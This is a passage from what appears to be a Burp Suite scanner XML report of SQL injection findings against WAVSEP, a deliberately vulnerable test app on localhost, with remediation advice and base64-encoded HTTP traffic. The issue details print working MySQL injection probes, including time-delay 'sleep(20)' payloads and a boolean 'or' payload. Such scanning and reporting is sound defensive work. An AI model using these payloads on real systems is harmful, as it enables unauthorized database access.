ZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjU3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6652867442740967424</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>10757188 or 8750=08750</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxTeW50YXhFcnJvckV4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJzIwMTAtMDEtMDEnJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClNldmVyYWwgYWNjb3VudHMgbWF0Y2ggdGhlIGNyaXRlcmlhLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxMTA3NTcxODglMjBvciUyMDg3NTAlM2QwODc1MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNDIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxFeGNlcHRpb246IEluY29ycmVjdCBEQVRFIHZhbHVlOiAnMjAxMC0wMS0wMTEwNzU3MTg4IG9yIDg3NTA9MDg3NTAnCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8044512220191323136</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the transactionDate parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EY